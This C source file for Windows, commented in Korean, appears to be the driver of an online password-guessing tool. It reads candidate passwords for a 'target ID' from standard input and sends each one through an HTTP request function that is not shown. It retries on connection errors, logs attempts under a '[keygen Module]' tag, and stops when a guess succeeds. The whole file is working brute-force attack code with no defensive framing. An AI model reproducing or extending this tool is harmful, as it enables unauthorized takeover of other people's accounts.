#include <stdio.h>
#include <windows.h>
#include "httpModule.h"
#include "common.h"
#include "logfileModule.h"

extern char g_id[MAX_ID];
extern char savingFilename[MAX_PATH];

void processingStdin(char *_id)
{
	strcpy_s(g_id,MAX_ID, _id);	// id 설정

	char pwdKey[MAX_PASSWORD];
	char writeBufferStr[LOGGING_BUFFER];	// 로깅용 버퍼
	int returnValue, resultQuery;
	int retryRemain;
	
	// 반복횟수 셋
	retryRemain = RETRY_CONNECT;
	do {
		if(RETRY_CONNECT == retryRemain) {	// 처음 시도일 때만
			returnValue = scanf_s("%s", pwdKey, MAX_PASSWORD);
			if(EOF == returnValue) break;
		}		

		// 쿼리
		resultQuery = requestPassword(pwdKey);
		printf("%s\t%d\n", pwdKey, resultQuery);	// 출력

		if(TRUE == resultQuery || CONNECT_ERROR == resultQuery) return;	// 통과 & 네트워크 문제
		else if(EXCEPT_ERROR == resultQuery) {	// 접속문제(완벽하지 않음)
			if(--retryRemain > 0) {
				// 로그 기록
				wsprintf(writeBufferStr,"[keygen Module]\r\n%s\t%d\r\n\r\n", pwdKey, resultQuery);	// 로그문자열 생성
				writeLog(writeBufferStr);	// 로그 기록
			}
			else {
				return;
				// retryRemain = RETRY_CONNECT;
			}
		}
		else {	// 실패시에는 반복회수 원점
			retryRemain = RETRY_CONNECT;
		}

		printf("");		// 버퍼 비움
		
	}
	while (1);
}
void stdinEntry(char * id)
{
	SYSTEMTIME stCurrStartTime, stCurrEndTime;		// 시스템 시간
	GetLocalTime(&stCurrStartTime);		// 현재 로컬 시간을 구한다.
	wsprintf(savingFilename, "%s_%04d%02d%02d_%02d%02d.log", id, 
		stCurrStartTime.wYear, stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute);	// set to global var(로그파일이름)

	processingStdin(id);	// 처리

	GetLocalTime(&stCurrEndTime);	// 현재 로컬 시간을 구한다.

	// 정보 출력
	printf("target ID : %s\n", id);
	printf("Start : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute,stCurrStartTime.wSecond, stCurrStartTime.wMilliseconds);
	printf("End   : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrEndTime.wMonth,stCurrEndTime.wDay,
		stCurrEndTime.wHour, stCurrEndTime.wMinute,stCurrEndTime.wSecond,stCurrEndTime.wMilliseconds);
	WinExec("MessageBox.exe Terminated", SW_SHOWNORMAL);	// 프로그램 종료시 윈도우 메시지
}